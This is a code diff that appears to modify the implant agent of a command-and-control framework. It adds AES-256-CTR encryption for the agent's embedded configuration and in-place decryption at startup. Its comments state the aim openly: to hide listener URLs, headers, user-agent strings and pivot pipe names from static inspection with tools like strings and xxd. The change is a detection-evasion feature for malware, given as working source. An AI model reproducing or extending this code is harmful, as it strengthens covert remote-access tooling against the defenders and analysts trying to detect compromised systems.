@@ -21,8 +21,15 @@
 /* [HVC-005 2026-03-28] RSA-2048-OAEP-SHA256 key wrapping for registration. */
 #include <crypt/RsaCrypt.h>
 
+/* [HVC-014 2026-04-28] AES-256-CTR for encrypted CONFIG_BYTES embedding. */
+#include <crypt/AesCrypt.h>
+
 /* Global Variables */
 SEC_DATA PINSTANCE Instance      = { 0 };
+/* [HVC-014 2026-04-28] AgentConfig holds AES-256-CTR ciphertext at startup;
+ * decrypted in-place at the top of DemonConfig() before parsing. The bytes
+ * here look like random data to xxd / strings — listener URLs, headers,
+ * user-agent, pivot pipe names are NOT visible in the binary. */
 SEC_DATA BYTE      AgentConfig[] = CONFIG_BYTES;
 
 /*
@@ -631,6 +638,26 @@ VOID DemonConfig()
     DWORD  J      = 0;
 
     PRINTF( "Config Size: %d\n", sizeof( AgentConfig ) )
+
+    /* [HVC-014 2026-04-28] Decrypt the embedded config in-place before parsing.
+     * The CONFIG_KEY and CONFIG_IV macros expand to byte-array initializers
+     * generated freshly by builder.go for this build. Plaintext listener URLs,
+     * headers, user-agent etc. were never present in the binary file — only
+     * AES-256-CTR ciphertext was. After this block the parser sees plaintext.
+     * Local key material is wiped immediately after the in-place decrypt. */
+    {
+        AESCTX CfgAes        = { 0 };
+        BYTE   CfgKey[ 32 ]  = CONFIG_KEY;
+        BYTE   CfgIv [ 16 ]  = CONFIG_IV;
+
+        AesInit( &CfgAes, CfgKey, CfgIv );
+        AesXCryptBuffer( &CfgAes, ( PUINT8 ) AgentConfig, sizeof( AgentConfig ) );
+
+        RtlSecureZeroMemory( CfgKey,  sizeof( CfgKey ) );
+        RtlSecureZeroMemory( CfgIv,   sizeof( CfgIv  ) );
+        RtlSecureZeroMemory( &CfgAes, sizeof( CfgAes ) );
+        PUTS( "[HVC-014] config decrypted in-place" )
+    }
 
     ParserNew( &Parser, AgentConfig, sizeof( AgentConfig ) );
     RtlSecureZeroMemory( AgentConfig, sizeof( AgentConfig ) );
